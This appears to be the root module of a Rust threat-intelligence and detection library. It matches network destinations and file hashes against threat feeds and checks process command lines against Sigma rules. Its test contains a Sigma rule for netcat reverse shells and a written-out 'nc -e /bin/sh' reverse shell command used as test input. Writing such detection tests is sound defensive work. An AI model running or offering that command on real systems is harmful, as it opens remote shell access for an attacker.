//! KWALL Threat Intelligence, MITRE ATT&CK Matrix & Sigma Rule Engine.

pub mod bloom;
pub mod compliance;
pub mod feed;
pub mod indicator;
pub mod matcher;
pub mod mitre;
pub mod sigma;

pub use bloom::ThreatBloomFilter;
pub use compliance::{ComplianceHeatmapReport, MitreComplianceTracker, TacticCoverage};
pub use feed::{
    parse_blocklist_text, parse_misp_json, parse_stix2_json, FeedConfig, ThreatFeedManager,
};
pub use indicator::{IndicatorType, ThreatIndicator};
pub use matcher::ThreatIntelMatcher;
pub use mitre::{MitreMatrix, MitreTactic, MitreTechnique};
pub use sigma::{
    CompiledSigmaRule, FieldPattern, PatternModifier, SigmaEngine, SigmaLogSourceCategory,
};

use kwall_core::types::Severity;
use kwall_detection::alert::{ThreatAlert, ThreatCategory};
use std::collections::HashMap;
use std::net::Ipv4Addr;
use std::sync::RwLock;

/// Comprehensive Threat Intelligence and Detection Rule Engine.
pub struct ThreatIntelEngine {
    feed_manager: ThreatFeedManager,
    matcher: RwLock<ThreatIntelMatcher>,
    sigma_engine: RwLock<SigmaEngine>,
    compliance_tracker: MitreComplianceTracker,
}

impl Default for ThreatIntelEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl ThreatIntelEngine {
    /// Constructs a new ThreatIntelEngine.
    #[must_use]
    pub fn new() -> Self {
        Self {
            feed_manager: ThreatFeedManager::new(),
            matcher: RwLock::new(ThreatIntelMatcher::new()),
            sigma_engine: RwLock::new(SigmaEngine::new()),
            compliance_tracker: MitreComplianceTracker::new(),
        }
    }

    /// Ingests a STIX 2.1 JSON bundle from a named threat feed.
    pub fn ingest_stix(&self, json_content: &str, config: &FeedConfig, timestamp_ns: u64) {
        let indicators = parse_stix2_json(json_content, config, timestamp_ns);
        self.feed_manager.ingest_indicators(indicators);
        self.rebuild_matcher(timestamp_ns);
    }

    /// Ingests a MISP JSON export from a named threat feed.
    pub fn ingest_misp(&self, json_content: &str, config: &FeedConfig, timestamp_ns: u64) {
        let indicators = parse_misp_json(json_content, config, timestamp_ns);
        self.feed_manager.ingest_indicators(indicators);
        self.rebuild_matcher(timestamp_ns);
    }

    /// Ingests a plaintext IP/CIDR/domain blocklist.
    pub fn ingest_blocklist(&self, text_content: &str, config: &FeedConfig, timestamp_ns: u64) {
        let indicators = parse_blocklist_text(text_content, config, timestamp_ns);
        self.feed_manager.ingest_indicators(indicators);
        self.rebuild_matcher(timestamp_ns);
    }

    /// Compiles all active threat indicators into high-speed Bloom filters and LPM structures.
    pub fn rebuild_matcher(&self, timestamp_ns: u64) {
        let active = self.feed_manager.get_active_indicators(timestamp_ns);
        let new_matcher = ThreatIntelMatcher::from_indicators(&active);
        let mut matcher_lock = self.matcher.write().unwrap();
        *matcher_lock = new_matcher;
    }

    /// Adds and compiles a Sigma detection rule from YAML.
    pub fn add_sigma_rule(&self, yaml_content: &str) -> Result<String, String> {
        let mut engine = self.sigma_engine.write().unwrap();
        engine.add_rule_yaml(yaml_content)
    }

    /// Evaluates an outbound network destination against known malicious IPs, CIDRs, and domains.
    #[must_use]
    pub fn evaluate_network_destination(
        &self,
        dst_ip: Ipv4Addr,
        domain: Option<&str>,
        timestamp_ns: u64,
        pod_name: &str,
        namespace: &str,
    ) -> Option<ThreatAlert> {
        let matcher = self.matcher.read().unwrap();

        // 1. Check destination IP / CIDR
        if let Some(ind) = matcher.match_ip(dst_ip) {
            let alert = ThreatAlert {
                alert_id: format!("ti-ip-{}", ind.value),
                timestamp_ns,
                severity: Severity::Critical,
                category: ThreatCategory::ThreatIntelMatch,
                mitre_attack_id: Some("T1071".to_string()),
                title: format!("Outbound connection to malicious indicator ({})", ind.threat_category),
                description: format!(
                    "Pod '{}/{}' initiated network traffic to known threat intel destination: {} (Feed: {}, Actor: {:?})",
                    namespace, pod_name, ind.value, ind.source_feed, ind.actor
                ),
                workload: None,
                evidence: serde_json::json!({
                    "indicator": ind.value,
                    "feed": ind.source_feed,
                    "actor": ind.actor,
                    "dst_ip": dst_ip.to_string(),
                }),
                recommended_action: "Quarantine workload and sever established network sockets.".to_string(),
            };
            self.compliance_tracker.record_alert(&alert);
            return Some(alert);
        }

        // 2. Check destination domain if provided
        if let Some(dom) = domain {
            if let Some(ind) = matcher.match_domain(dom) {
                let alert = ThreatAlert {
                    alert_id: format!("ti-domain-{}", ind.value),
                    timestamp_ns,
                    severity: Severity::Critical,
                    category: ThreatCategory::ThreatIntelMatch,
                    mitre_attack_id: Some("T1071".to_string()),
                    title: format!("Outbound communication to malicious domain ({})", ind.threat_category),
                    description: format!(
                        "Pod '{}/{}' attempted communication to malicious domain '{}' matching threat indicator '{}' (Feed: {})",
                        namespace, pod_name, dom, ind.value, ind.source_feed
                    ),
                    workload: None,
                    evidence: serde_json::json!({
                        "domain": dom,
                        "indicator": ind.value,
                        "feed": ind.source_feed,
                    }),
                    recommended_action: "Block DNS resolution and inspect originating container process.".to_string(),
                };
                self.compliance_tracker.record_alert(&alert);
                return Some(alert);
            }
        }

        None
    }

    /// Evaluates process execution against compiled Sigma rules.
    #[must_use]
    pub fn evaluate_process_execution(
        &self,
        image: &str,
        command_line: &str,
        user: &str,
        timestamp_ns: u64,
        pod_name: &str,
        namespace: &str,
    ) -> Vec<ThreatAlert> {
        let mut fields = HashMap::new();
        fields.insert("Image".to_string(), image.to_string());
        fields.insert("CommandLine".to_string(), command_line.to_string());
        fields.insert("User".to_string(), user.to_string());

        let sigma = self.sigma_engine.read().unwrap();
        let alerts = sigma.evaluate(
            SigmaLogSourceCategory::ProcessCreation,
            &fields,
            timestamp_ns,
            pod_name,
            namespace,
        );

        for alert in &alerts {
            self.compliance_tracker.record_alert(alert);
        }

        alerts
    }

    /// Evaluates a binary hash against known malware indicators.
    #[must_use]
    pub fn evaluate_binary_hash(
        &self,
        sha256: &str,
        file_path: &str,
        timestamp_ns: u64,
        pod_name: &str,
        namespace: &str,
    ) -> Option<ThreatAlert> {
        let matcher = self.matcher.read().unwrap();
        if let Some(ind) = matcher.match_hash(sha256) {
            let alert = ThreatAlert {
                alert_id: format!("ti-hash-{}", sha256),
                timestamp_ns,
                severity: Severity::Critical,
                category: ThreatCategory::ThreatIntelMatch,
                mitre_attack_id: Some("T1204".to_string()),
                title: format!("Execution of known malicious binary hash ({})", ind.threat_category),
                description: format!(
                    "File '{}' with SHA256 '{}' on pod '{}/{}' matches known malware from feed '{}'",
                    file_path, sha256, namespace, pod_name, ind.source_feed
                ),
                workload: None,
                evidence: serde_json::json!({
                    "sha256": sha256,
                    "file_path": file_path,
                    "feed": ind.source_feed,
                }),
                recommended_action: "Terminate process immediately and freeze container cgroup.".to_string(),
            };
            self.compliance_tracker.record_alert(&alert);
            return Some(alert);
        }

        None
    }

    /// Generates a cluster MITRE ATT&CK coverage report and heatmap.
    #[must_use]
    pub fn generate_compliance_report(
        &self,
        cluster_id: &str,
        timestamp_ns: u64,
    ) -> ComplianceHeatmapReport {
        self.compliance_tracker
            .generate_report(cluster_id, timestamp_ns)
    }

    /// Returns the underlying feed manager.
    #[must_use]
    pub fn feed_manager(&self) -> &ThreatFeedManager {
        &self.feed_manager
    }

    /// Access the compliance tracker.
    #[must_use]
    pub fn compliance_tracker(&self) -> &MitreComplianceTracker {
        &self.compliance_tracker
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_threat_intel_engine_end_to_end() {
        let engine = ThreatIntelEngine::new();

        // 1. Ingest C2 feed
        let blocklist = "198.51.100.99\n203.0.113.0/24\nevil-rat.org\n";
        let config = FeedConfig {
            feed_name: "test_c2".to_string(),
            default_confidence: 90,
            default_category: "c2".to_string(),
            default_actor: Some("APT28".to_string()),
            indicator_ttl_ns: None,
        };
        engine.ingest_blocklist(blocklist, &config, 1_000_000);

        // 2. Add Sigma rule
        let sigma = r#"
title: Netcat Reverse Shell
id: netcat-rev-shell-1
logsource:
    category: process_creation
detection:
    selection:
        CommandLine|contains: 'nc -e'
    condition: selection
level: critical
tags:
    - attack.execution
    - attack.t1059.004
"#;
        assert!(engine.add_sigma_rule(sigma).is_ok());

        // 3. Evaluate matching IP
        let hit_ip = engine.evaluate_network_destination(
            Ipv4Addr::new(198, 51, 100, 99),
            None,
            1_000_100,
            "frontend-pod",
            "production",
        );
        assert!(hit_ip.is_some());
        assert_eq!(hit_ip.unwrap().mitre_attack_id.as_deref(), Some("T1071"));

        // 4. Evaluate matching domain
        let hit_domain = engine.evaluate_network_destination(
            Ipv4Addr::new(10, 0, 0, 1),
            Some("sub.evil-rat.org"),
            1_000_200,
            "backend-pod",
            "production",
        );
        assert!(hit_domain.is_some());

        // 5. Evaluate Sigma process
        let alerts = engine.evaluate_process_execution(
            "/bin/nc",
            "nc -e /bin/sh 198.51.100.99 4444",
            "www-data",
            1_000_300,
            "frontend-pod",
            "production",
        );
        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].mitre_attack_id.as_deref(), Some("T1059.004"));

        // 6. Generate Compliance Heatmap Report
        let report = engine.generate_compliance_report("k8s-prod-us-west", 1_000_400);
        assert_eq!(report.cluster_id, "k8s-prod-us-west");
        assert_eq!(report.total_alerts_recorded, 3);
        let md = report.to_markdown();
        assert!(md.contains("k8s-prod-us-west"));
        assert!(md.contains("T1071"));
        assert!(md.contains("T1059.004"));
    }
}
